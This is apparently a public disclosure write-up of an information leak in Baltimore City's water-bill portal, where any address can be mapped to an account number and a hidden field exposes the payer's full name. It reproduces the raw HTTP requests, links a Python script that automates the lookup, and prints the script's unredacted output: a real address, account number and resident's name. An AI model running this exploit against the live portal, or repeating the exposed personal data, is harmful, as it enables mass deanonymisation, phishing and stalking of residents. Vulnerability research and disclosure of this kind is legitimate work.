# BaltimoreCity-WaterBill-InfoDisclosure
- The Baltimore City water bill portal suffers from an information disclosure vulnerability allowing anyone to view who is paying the bill for a particular address

## How it all started: 
Baltimore City public services are not known for their successes, quite the contrary. From a 2019 Ransomware attack that left key services crippled, to customer information being "hidden" on the Water Bill portal, the city truly needs a new, refreshing outlook on cybersecurity. This comes just after the Baltimore City public school systems fell prey to a massive data breach

https://en.wikipedia.org/wiki/2019_Baltimore_ransomware_attack
https://www.wbaltv.com/article/cyberattack-baltimore-city-public-schools-students-staff-cloak/64543595
https://www.verizon.com/business/resources/articles/s/lessons-from-the-robbinhood-ransomware-attack-on-baltimore/

City residences are forced to pay their water bill on a monthly basis manually, as there is no auto-pay option, dispite auto-pay being almost universal across America in 2025.
Customers can look up their account information via service address or 11 digit account number. While there is a "create account option" It is not provided on the main page. Accessing an account via street address (any address, unauthenticated) will yield you the users 11 digit account number. Personally, I believe account numbers should be provided only to the individual that lives at the residence, as this opens the door to phishing attacks, OSINT.
As you can see above, and below, I have accessed the account information for a residence in Baltimore City without authenticating, or providing proof that I am a resident at the aforementioned address. Keep in mind, the owners name is no where to be found on the "Water Bill Details" page. We will see a bit later that this is not entirely true.
When analyzing the requests in Burp Suite, we can see the first request for the main page looks very standard
````
GET /water HTTP/1.1
Host: pay.baltimorecity.gov
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
````
- The response is equally mundane, however its trivial to programmatically retrieve any service account based upon a street address, as we saw above albeit manually.

````
POST /water/_getInfoByServiceAddress HTTP/1.1
Host: pay.baltimorecity.gov
Cookie: .AspNetCore.Antiforgery.JY-etYUE_us=CfDJ8EBkMsT-U-RHiQLECtE6oX3-APJ8UP_7dagFAzSoAh6HXeLRm3ypQVDbOZwKMxVjN9narb_PssUyWDMQrkoa2jv6pJNNFk_cSq-3RHQd7dnJXYNC1lEX4kRZof_AC8SydPSG2m1BWAXmwe99MNaAEcY; vxu=H2d1XUyWvCg7GGuFeovv_A; vxr=6.46; vxp=1
Content-Length: 32
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://pay.baltimorecity.gov
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://pay.baltimorecity.gov/water
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

serviceAddress=<REDACTED>
````
- After obtaining the account number via a serviceAddress query, one can simply pull the entire account information by querying the api via serviceAccount, as seen below
````
POST /water/_getInfoByAccountNumber HTTP/1.1
Host: pay.baltimorecity.gov
Cookie: .AspNetCore.Antiforgery.JY-etYUE_us=CfDJ8EBkMsT-U-RHiQLECtE6oX3-APJ8UP_7dagFAzSoAh6HXeLRm3ypQVDbOZwKMxVjN9narb_PssUyWDMQrkoa2jv6pJNNFk_cSq-3RHQd7dnJXYNC1lEX4kRZof_AC8SydPSG2m1BWAXmwe99MNaAEcY; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8EBkMsT-U-RHiQLECtE6oX0xUs6stwrVsw_-zh2jG127fj0B7SIbquRnqsWhoFaKVW2QnmG3z64JzD2yT3Y4Ny1Zz5v30XjNAQMb95-HrN_kMVsbq93xIKx_wCL05JqM1TSnpSH7QyVL5hGBOoKykon3PNLQMs6KizNCI8OLaaJVnZPzWpfuPi0_OxqEMIDJRTBaGrjv0Hp40rRZetZ9ZCU; vxu=H2d1XUyWvCg7GGuFeovv_A; vxr=6.46; vxp=1
Content-Length: 208
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://pay.baltimorecity.gov
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://pay.baltimorecity.gov/water
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

AccountNumber=<REDACTED>&__RequestVerificationToken=CfDJ8EBkMsT-U-RHiQLECtE6oX0uWZpxUB0_1C_4rlEINI7Uxw43YMK2SmuO7PyXwnd3mXssu0lQcVmAGXbidXnGaDuNbvtCwaNDAcTGYTfjtu3g4nix4L8DyxcLOAXqz4WTrRD4Cq_3P02GIuJbDkLrwKs
````
- When this request is returned you will be re-directed and another GET request will be made. This request lines up with the "Water Bill Details" page that we previously saw when browsing the site manually. To my astonishment, the full name of the individual paying the water bill is hidden in the HTML response! The full name is not rendered in the HTML to the end user as the attribute is of type hidden.
````
GET /water/bill HTTP/1.1
Host: pay.baltimorecity.gov
Cookie: .AspNetCore.Antiforgery.JY-etYUE_us=CfDJ8EBkMsT-U-RHiQLECtE6oX3-APJ8UP_7dagFAzSoAh6HXeLRm3ypQVDbOZwKMxVjN9narb_PssUyWDMQrkoa2jv6pJNNFk_cSq-3RHQd7dnJXYNC1lEX4kRZof_AC8SydPSG2m1BWAXmwe99MNaAEcY; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8EBkMsT-U-RHiQLECtE6oX25egV1tivert_uOHC3tUXPNNRWpswDoi3DlV4nuAtWE-tLdn6JTziD8EdxmQ4SMThBK14zTLT0R7PmnDO9v8vYzzwP02IDq6K6Y6GkO4T-g4TCpWGkZnpuAVu5b4g-RlRxkhSKd_toccyiMMjsuHWiOYGZo26IFfLkNq0xbykTBUgSjmPnYbfbf8PyuYhgL-Y; vxu=H2d1XUyWvCg7GGuFeovv_A; vxr=6.46; vxp=3; vxl=1753033420
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://pay.baltimorecity.gov/water
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

// Response
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store
Pragma: no-cache
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: ALLOWALL
Set-Cookie: .AspNetCore.Mvc.CookieTempDataProvider=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/water; samesite=lax; httponly
X-Powered-By: ASP.NET
Date: Sun, 20 Jul 2025 17:44:55 GMT
Content-Length: 15971

--snip--
<div class="text-right">
<input data-val="true" data-val-required="The AccountNumber field is required." id="AccountNumber" name="AccountNumber" type="hidden" value="<REDACTED>" />
<input data-val="true" data-val-required="The ServiceAddress field is required." id="ServiceAddress" name="ServiceAddress" type="hidden" value="<REDACTED>       " />
<input data-val="true" data-val-number="The field Balance must be a number." id="Balance" name="Balance" type="hidden" value="46.1500" />
<input data-val="true" data-val-required="The CustomerName field is required." id="CustomerName" name="CustomerName" type="hidden" value="<REDACTED>          " />
<input id="BillDate" name="BillDate" type="hidden" value="7/14/2025 12:00:00 AM" /><input id="PenaltyDate" name="PenaltyDate" type="hidden" value="8/3/2025 12:00:00 AM" />                                        <button type="submit" class="btn btn-primary" id="btnPayOnline">&nbsp;Pay Online&nbsp;&raquo;</button>
</div>
--snip--
````
## Automation
After examining the requests and responses, I decided automating the owner name lookup via Python would be a very simple exercise. My decision to automate this script and write about the Information Disclosure issue is largely in part to Baltimore City not having a Bug bounty program, or any sort of contact information regarding website issues/vulnerabilities. After researching around, for longer than I care to admit, Maryland as a whole ran a Bug bounty program, however it was for a limited duration, and at the time of writing, they have shut the program down. I decided to reach out to some Baltimore City news outlets, in the hopes of potentially drawing attention to the issue, however no response was received. Thus, please see the below repo for the automated script:
- https://github.com/ice-wzl/BaltimoreCity-WaterBill-InfoDisclosure
## Running the Script
Running the script is as simple as providing a valid address in Baltimore City:
````
python .\get_name.py -h
usage: get_name.py [-h] -a ADDRESS

Get the name of a Baltimore City resident based on an address/account number, due to an information diclosure in the
Water Bill service.

options:
  -h, --help            show this help message and exit
  -a, --address ADDRESS
                        The address of the resident.

python3 .\get_name.py -a "1530 S Hanover St"
Anti-Forgery Cookie: {'.AspNetCore.Antiforgery.JY-etYUE_us': 'CfDJ8GzCaZHaEs5BtBOcODITSAxlBXA9xmM_Cm68CvhhflRXP6RtoWvah2YVL_7C0qoJxlXSY9hfWR8IYMTjZoRstd1Nn_GSZFBXFuvuxjS7QfvoTqn2oIwRd_8ljG_YGIe8O2mFL3i0AJ9eiRq50qdZPS8'}
Request Verification Token: CfDJ8GzCaZHaEs5BtBOcODITSAzGwFkbnMheH0_-0Mpq6vLjG5yFjDTOrXlrMjUu6wuD-ThhYkTBUNoYDzykOPZT5x1vaRB5rMu62I5RViqjMLKwMeJ6RSiW4aCCpTcvQVCJyOdhdL0NFJ5nieZqH6E1ulE
Account Number: 11000203544, Address: 1530 S HANOVER ST
Name associated with account number 11000203544: ABBY GUSTAITIS
````
- Contact: ice-wzl@protonmail.com